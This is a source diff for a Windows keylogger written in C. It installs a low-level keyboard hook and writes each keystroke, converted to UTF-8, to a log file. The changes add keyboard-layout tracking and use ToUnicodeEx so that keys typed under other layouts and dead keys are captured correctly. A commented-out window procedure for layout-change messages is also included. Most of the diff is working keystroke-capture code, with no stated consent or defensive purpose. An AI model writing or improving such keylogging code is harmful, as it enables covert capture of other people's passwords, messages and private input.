@@ -1,6 +1,7 @@
 #include "logs.h"
 
 HHOOK hKeyboardHook = NULL;
+HKL currentKBLayout = NULL;
 
 void	write_to_file(char *str)
 {
@@ -82,13 +83,25 @@ LRESULT CALLBACK LowLevelKeyboardProc(
 	if (nCode >= 0)
 	{
 
-		static HKL	KBLayoutCode = NULL;
 		HKL		newKBLayout = GetKeyboardLayout(0);
-		if (KBLayoutCode && newKBLayout != KBLayoutCode) {
+		if (currentKBLayout && newKBLayout != currentKBLayout) {
 			char testLog[64];
 			sprintf_s(testLog, sizeof(testLog), "\nKeyboard Layout [%p]\n", (void*)newKBLayout);
 				write_to_file(testLog);
 		}
+		if (currentKBLayout == NULL) {
+            currentKBLayout = newKBLayout;
+            char testLog[64];
+            sprintf_s(testLog, sizeof(testLog), "\nKeyboard Layout initialized [%p]\n", (void*)newKBLayout);
+            write_to_file(testLog);
+        }
+        else if (newKBLayout != currentKBLayout) {
+            char testLog[64];
+            sprintf_s(testLog, sizeof(testLog), "\nKeyboard Layout changed [%p] -> [%p]\n", 
+                (void*)currentKBLayout, (void*)newKBLayout);
+            write_to_file(testLog);
+            currentKBLayout = newKBLayout;
+        }
 		KBDLLHOOKSTRUCT* keyboardHookPtr = (KBDLLHOOKSTRUCT*)lParam;
 		DWORD	keyCode = keyboardHookPtr->vkCode;
 		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
@@ -293,20 +306,46 @@ LRESULT CALLBACK LowLevelKeyboardProc(
 				GetKeyboardState(keyboardState);
 
 				WCHAR unicodeBuffer[5];
-				int result = ToUnicode(keyCode, keyboardHookPtr->scanCode, keyboardState, unicodeBuffer, 4, 0);
+				  int result = ToUnicodeEx(keyCode, keyboardHookPtr->scanCode, 
+                    keyboardState, unicodeBuffer, 4, 0, currentKBLayout);
 
 				if (result > 0)
-				{
-					unicodeBuffer[result] = L'\0';
-					char utf8Buffer[16];
-					int bytesWritten = WideCharToMultiByte(CP_UTF8, 0, unicodeBuffer, -1, utf8Buffer, sizeof(utf8Buffer), NULL, NULL);
-					if (bytesWritten > 0)
-					{
-						write_to_file(utf8Buffer);
-					}
-				}
+                {
+                    unicodeBuffer[result] = L'\0';
+                    char utf8Buffer[16];
+                    int bytesWritten = WideCharToMultiByte(CP_UTF8, 0, unicodeBuffer, -1, 
+                        utf8Buffer, sizeof(utf8Buffer), NULL, NULL);
+                    if (bytesWritten > 0)
+                        write_to_file(utf8Buffer);
+                }
+                else if (result == -1)
+                    write_to_file("[DEAD_KEY]");
 			}
 		}
 	}
 	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
 }
+
+// LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
+// {
+// 	 write_to_file("\n\nWINDPROC CALLBACK DETECTED !!!!\n\n");
+// 	switch (uMsg)
+//     {
+//         case WM_INPUTLANGCHANGE:
+//         {
+//             HKL newLayout = (HKL)lParam;
+//             char logEntry[128];
+//             sprintf_s(logEntry, sizeof(logEntry), 
+//                 "\n[LAYOUT_CHANGE] WM_INPUTLANGCHANGE detected: [%p]\n", 
+//                 (void*)newLayout);
+//             write_to_file(logEntry);
+//             currentKBLayout = newLayout;
+            
+//             return 0;
+//         }
+//         case WM_DESTROY:
+//             PostQuitMessage(0);
+//             return 0;
+//     }
+// 	return DefWindowProc(hwnd, uMsg, wParam, lParam);
+// }
